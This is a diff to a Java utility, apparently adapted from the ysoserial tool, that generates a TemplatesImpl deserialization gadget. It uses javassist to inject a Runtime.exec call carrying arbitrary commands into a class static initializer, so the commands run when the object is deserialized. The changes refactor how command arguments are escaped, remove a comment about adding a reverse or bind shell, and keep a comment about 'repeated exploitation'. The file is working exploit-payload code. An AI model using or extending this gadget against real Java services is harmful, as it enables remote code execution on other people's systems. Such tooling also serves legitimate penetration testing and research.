@@ -21,21 +21,24 @@ package jackson;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.CannotCompileException;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import org.apache.commons.text.StringEscapeUtils;
+import ser05j.ClassFiles;
+import ser05j.Reflections;
+
 import java.io.IOException;
 import java.io.Serializable;
 import java.lang.reflect.InvocationTargetException;
-
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-
-import javassist.*;
-
-import ser05j.ClassFiles;
-import ser05j.Reflections;
+import java.util.Arrays;
+import java.util.stream.Collectors;
 
 /*
  * utility generator functions for common jdk-only gadgets
@@ -75,16 +78,15 @@ public class TemplatesUtil {
   }
 
 
-  public static Object createTemplatesImpl(final String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, IOException, CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
-    if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
-      return createTemplatesImpl(
-          args,
-          Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
-          Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
-          Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
-    }
-
-    return createTemplatesImpl(args, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+  public static Object createTemplatesImpl(final String[] args)
+      throws ClassNotFoundException, IllegalAccessException, InstantiationException, IOException,
+             CannotCompileException, NotFoundException, NoSuchFieldException, NoSuchMethodException,
+             InvocationTargetException {
+    return createTemplatesImpl(
+        args,
+        Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+        Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+        Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
   }
 
 
@@ -98,8 +100,6 @@ public class TemplatesUtil {
     pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
     pool.insertClassPath(new ClassClassPath(abstTranslet));
     final CtClass clazz = pool.get(StubTransletPayload.class.getName());
-    // run command in static initializer
-    // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
 
     StringBuilder sb = new StringBuilder();
     boolean first = true;
@@ -116,7 +116,16 @@ public class TemplatesUtil {
       sb.append('"');
     }
 
-    clazz.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(new String[] { " + sb.toString() + " });");
+    String cmdArgs = Arrays.stream(args)
+        .map(StringEscapeUtils::escapeJava)
+        .map(s -> "\"" + s + "\"")
+        .collect(Collectors.joining(", "));
+
+    String javaCode = "java.lang.Runtime.getRuntime().exec(new String[] { " + cmdArgs + " });";
+
+    System.out.println("Java code: " + javaCode);
+
+    clazz.makeClassInitializer().insertAfter(javaCode);
     // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
     clazz.setName("ysoserial.Pwner" + System.nanoTime());
     CtClass superC = pool.get(abstTranslet.getName());
